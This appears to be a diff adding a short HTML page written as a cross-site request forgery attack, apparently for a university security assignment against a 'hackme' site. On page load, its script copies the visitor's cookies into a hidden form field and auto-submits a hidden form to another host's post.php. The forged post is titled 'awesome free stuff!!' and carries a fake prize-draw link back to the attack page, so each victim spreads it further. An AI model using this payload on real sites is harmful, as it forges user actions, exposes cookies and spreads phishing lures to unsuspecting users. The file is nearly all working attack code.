@@ -1,0 +1,20 @@
+<html>  
+   <body>
+    <script>
+        window.onload = function(){
+                console.log("html loaded,should call php next");
+                document.getElementById("cookie").value = document.cookie;
+                document.getElementById("post_submit").click();
+            
+        }
+    </script>
+   <!-- <form method = post action="http://fiona.utdallas.edu/~zxw180035/xsrf/p3.php"> -->
+    <form method = post action="http://fiona.utdallas.edu/~zxw180035/hackme/post.php">
+           <input type ="hidden" name="cookie" id="cookie">
+           <input type="hidden" name="title" value="awesome free stuff!!" >
+           <input type ="hidden" name="message" id="message" value='<a href="http://fiona.utdallas.edu/~zxw180035/xsrf/xsrf.html">Prize draw. Only one hour left!</a> '>
+       <input type="submit" name="post_submit" id="post_submit" value="POST" style="display: none;" >
+   </form>
+   </body>
+</html>
+
